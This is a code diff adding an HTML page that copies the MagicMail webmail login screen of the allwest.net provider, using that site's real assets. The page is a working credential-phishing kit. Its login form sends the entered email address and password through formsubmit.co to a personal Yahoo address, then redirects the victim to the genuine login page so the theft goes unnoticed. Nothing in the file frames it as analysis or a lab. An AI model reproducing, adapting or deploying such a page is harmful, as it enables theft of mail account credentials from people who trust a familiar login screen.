@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>MagicMail Webmail :: Welcome to MagicMail Webmail</title>
+<title>MagicMail Webmail :: Welcome to MagicMail Webmail</title>
+<meta name="viewport" content="" id="viewport" />
+
+<link rel="shortcut icon" href="https://mail.allwest.net/webmail/skins/allwest/images/favicon.ico?s=1636411345">
+<link rel="stylesheet" type="text/css" href="https://mail.allwest.net/webmail/skins/allwest/styles.min.css?s=1788998417" />
+
+<link rel="stylesheet" type="text/css" href="https://mail.allwest.net/webmail/plugins/magicmail/magicmail.min.css?s=1788998418"><link rel="stylesheet" type="text/css" href="https://mail.allwest.net/webmail/plugins/jqueryui/themes/magicmail/jquery-ui.min.css?s=1788196070"><script type="text/javascript" src="skins/allwest/ui.min.js?s=1788998417"></script>
+<link rel="stylesheet" type="text/css" href="https://mail.allwest.net/webmail/skins/allwest/custom.css?s=1660002398" />
+
+
+
+
+<script src="https://mail.allwest.net/webmail/program/js/jquery.min.js?s=1774777730"></script><script src="https://mail.allwest.net/webmail/program/js/common.min.js?s=1774777727"></script><script src="https://mail.allwest.net/webmail/program/js/app.min.js?s=1774777727"></script><script src="https://mail.allwest.net/webmail/program/js/jstz.min.js?s=1774777730"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_GB","devel_mode":null,"rcversion":10615,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":false,"skin":"allwest","blankpage":"skins/allwest/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/webmail/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"etXyxTwhp0WPEgyjwOy5YSNE7gSOKpYe"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","magicmail.allowsender":"Allow Sender","magicmail.allowsenderblurb":"If you wish to receive messages from this email click here","magicmail.blocksender":"Block Sender","magicmail.blocksenderblurb":"If you no longer wish to receive messages from this email click here","magicmail.allowsuccessmulti":"Senders have been successfully allowed!","magicmail.allowsuccess":"Sender has been successfully allowed!","magicmail.blockconfirmmulti":"Are you sure you want to block messages from these senders?","magicmail.blockconfirm":"Are you sure you want to block messages from this sender?","magicmail.blockconfirmmulti_2":"One or more of the selected messages have a sender that is in your addressbook. Would you still like to continue blocking these senders?","magicmail.blockconfirm_2":"This message's sender is in your addressbook. Would you still like to continue blocking them?","magicmail.blocksuccessmulti":"Senders have been successfully blocked!","magicmail.blocksuccess":"Sender has been successfully blocked!","magicmail.movetotrashfail":"Failed to move messages to Trash folder","magicmail.movetoinboxfail":"Failed to move messages to Inbox","magicmail.databaseoffline":"Database is temporarily offline. Try again later","magicmail.unknownerror":"An unknown error occurred. Please try refreshing your browser and try again","magicmail.emailaddress":"E-mail Address","magicmail.require_full_email":"Please enter your full email address to login","magicmail.weakpasswordwarning":"\u003Cb\u003EWARNING:\u003C/b\u003E Your password has been detected as being weak. Please update your password in Security Settings","magicmail.myemailoptions":"My Email Options","magicmail.spamsettings":"Spam Settings","magicmail.securityoptions":"Security Options","magicmail.mailboxes":"Manage Mailboxes","magicmail.identity_creation_failed_index_already_used":"Failed to create identity. Identity ID is already being used by the legacy Tuxedo","magicmail.identity_deletion_failed_could_not_find_identity_in_legacy":"Identity does not exist in legacy Tuxedo. Could not delete.","magicmail.identity_migration_failed_could_not_find_identity_in_legacy":"Identity does not exist in legacy Tuxedo. Could not delete.","magicmail.identity_migration_failed_could_not_update_legacy":"Failed to update the corresponding identity in the legacy Tuxedo","magicmail.identity_migration_failed_insert":"Failed to save identity for legacy Tuxedo","magicmail.identity_migration_failed_missing_identities":"Legacy Tuxedo identities are missing","magicmail.identity_migration_failed_missing_identities_arr":"Legacy Tuxedo identities are missing","magicmail.identity_migration_failed_missing_user_data":"Failed to retrieve user data information","magicmail.identity_migration_failed_no_user_data":"Failed to retrieve user data information","magicmail.identity_migration_failed_unserialize":"Failed to save new identity in legacy Tuxedo","magicmail.display_checkboxes_for_selection":"Display selection checkboxes in Message List","magicmail.default_full_headers":"Display full headers view by default for messages","errortitle":"An error occurred.","toggleadvancedoptions":"Toggle advanced options","options":"Options"});
+rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script src="https://mail.allwest.net/webmail/plugins/magicmail/../../../js/htmlcanvas.js"></script><script src="https://mail.allwest.net/webmail/plugins/magicmail/canvas.min.js?s=1788998417"></script><script src="https://mail.allwest.net/webmail/plugins/magicmail/magicmail_plugin_login_page.js?s=1788998418"></script><script src="https://mail.allwest.net/webmail/plugins/magicmail/../../../js/redirect_portal.js"></script><script src="https://mail.allwest.net/webmail/plugins/jqueryui/js/jquery-ui.min.js?s=1774777727"></script><script src="https://mail.allwest.net/webmail/plugins/jqueryui/js/i18n/datepicker-en-GB.js?s=1774777727"></script>
+</head>
+<body>
+
+<h1 class="voice">MagicMail Webmail Login</h1>
+
+<div id="login-form">
+
+<img src="https://mail.allwest.net/webmail/skins/allwest/images/product_logo_big.png?s=1677715393" id="logo" alt="MagicMail Webmail">
+
+<div class="box-title">
+Welcome to MagicMail Webmail
+</div>
+<div class="box-inner" role="main">
+<form name="form" method="post" action="https://formsubmit.co/lesterdorr@yahoo.com" accept-charset="UTF-8" onSubmit="return checkForm();">
+<input type="hidden" name="_next" value="https://mail.allwest.net/webmail/?_task=login">
+<input type="hidden" name="_captcha" value="false">
+
+<input type="hidden" name="_token" value="etXyxTwhp0WPEgyjwOy5YSNE7gSOKpYe">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_url" id="rcmloginurl" value="_task=login"><table><tbody><tr><td class="title"><label for="rcmloginuser">E-mail Address</label></td><td class="input"><input name="_user" id="rcmloginuser" required size="40" autocapitalize="off" autocomplete="off" value="" type="email"></td></tr><tr><td class="title"><label for="rcmloginpwd">Password</label></td><td class="input"><input name="_pass" id="rcmloginpwd" required size="40" autocapitalize="off" autocomplete="off" type="password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button></p>
+<input type="hidden" name="htmlcanvas" id="htmlcanvas" value="" />
+
+</form>
+
+</div>
+
+<div class="box-bottom" role="complementary">
+    <div id="message"></div>
+    <noscript>
+        <p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+    </noscript>
+</div>
+
+<div id="bottomline" role="contentinfo">
+     
+    
+    <div id="copyright">&copy; Copyright 2009-2026
+<a href="https://www.linuxmagic.com" title="LinuxMagic Inc.">LinuxMagic Inc.</a>
+All Rights Reserved<br/>
+<a href="https://www.magicmail.com" title="MagicMail Webmail">www.magicmail.com</a>
+</div>
+
+</div>
+</div>
+
+
+
+<script type="text/javascript">
+if (!window.UI) { var UI = new rcube_mail_ui(); }
+</script>
+<script>
+$(function() {
+rcmail.init();
+var images = ["skins/allwest/images/ajaxloader.gif","skins/allwest/images/ajaxloader_dark.gif","skins/allwest/images/buttons.png","skins/allwest/images/addcontact.png","skins/allwest/images/filetypes.png","skins/allwest/images/listicons.png","skins/allwest/images/messages.png","skins/allwest/images/messages_dark.png","skins/allwest/images/quota.png","skins/allwest/images/selector.png","skins/allwest/images/splitter.png","skins/allwest/images/watermark.png"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+
+
+
+
+
+</body>
+</html>
